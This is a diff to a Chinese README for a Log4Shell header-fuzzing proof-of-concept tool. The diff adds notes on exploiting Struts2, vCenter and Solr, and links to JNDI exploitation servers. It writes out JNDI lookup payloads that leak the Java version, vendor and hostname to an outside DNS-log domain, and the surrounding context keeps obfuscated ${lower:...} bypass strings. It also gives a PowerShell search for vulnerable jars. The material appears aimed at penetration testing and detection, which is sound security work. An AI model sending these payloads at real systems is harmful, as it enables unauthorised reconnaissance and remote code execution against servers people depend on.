@@ -1,3 +1,67 @@
+
+# 更新
+
+## structs2版本
+添加了structs2静态文件 If-Modified-Since 头利用方式。
+参考：https://mp.weixin.qq.com/s/T-rcZnQxxUK1n2_lJNoUZg
+
+
+## structs2 利用变种
+添加了structs2利用方式变种。
+参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
+
+
+## vCenter 利用
+添加了vCenter利用
+参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
+
+
+## solr 利用
+添加了Apache solr利用
+参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
+
+
+# 关于影响面
+有一个新的站点发布了比此前相对更全内容.(包括各类设备与云设施等)
+- [Finding applications that use Log4J](https://www.rumble.run/blog/finding-log4j/?fbclid=IwAR0XbJNZ7FjsgVFIk5rlmf002twAaW14SJfdBHFYswWbOzDxzj4YIFnJZPU#affected-products-and-services)
+
+# 关于其他扫描器
+有一个新的扫描器挺火的，暂时没有时间验证
+- [log4j-scan](https://github.com/fullhunt/log4j-scan)
+
+portswigger 放出了官方的 burpsuite 被动扫描插件，官方的应该挺好用
+- Log4Shell Scanner 可以在 plugin store 直接下载
+
+# 关于 log4j2 发现漏洞后的进一步利用
+
+## 探测 jdk 版本等
+```
+${jndi:ldap://${env:JAVA_VERSION}.domain/a}
+${jndi:ldap://${sys:java.version}.domain/a}
+${jndi:ldap://${hostName}.domain/a}
+${jndi:ldap://${sys:java.vendor}.domain/a}
+```
+![image-20211214113047711](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20211214113047711.png)
+
+## 一次性探测完
+```
+${jndi:ldap://${sys:java.vendor}.@.${sys:java.version}.@.${hostName}.test.dnslog.cn/exp}
+```
+
+## 直接使用tomcat等可绕过高版本jdk限制的反序列化链
+可以使用 
+ - [veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi)
+ - [welk1n/JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)
+ - [JNDIExploit](https://github.com/GreyDr34d/JNDIExploit)
+
+
+# 关于类似漏洞的挖掘 
+## 挖掘其他可能存在 JndiLookup.class 的 jar 包
+powershell 命令：
+```powershell
+gci 'C:\' -rec -force -include *.jar -ea 0 | foreach {select-string "JndiLookup.class" $_} | select -exp Path
+```
+
 # log4j-fuzz-head-poc轻量级检测
 针对 log4j来批量fuzzz 请求头检测，有效检测一些头部存在的安全风险，nuclei默认使用interactsh的dnslog
 
@@ -15,25 +79,6 @@ ${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
 ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
 ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
 ```
-
-### structs2版本
-添加了structs2静态文件 If-Modified-Since 头利用方式。
-参考：https://mp.weixin.qq.com/s/T-rcZnQxxUK1n2_lJNoUZg
-
-
-### structs2 利用变种
-添加了structs2利用方式变种。
-参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
-
-
-### vCenter 利用
-添加了vCenter利用
-参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
-
-
-### solr 利用
-添加了Apache solr利用
-参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
 
 
 # 使用
@@ -64,3 +109,4 @@ ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/p
 * X-Wap-Profile
 * X-Api-Version
 * If-Modified-Since(structs2)
+
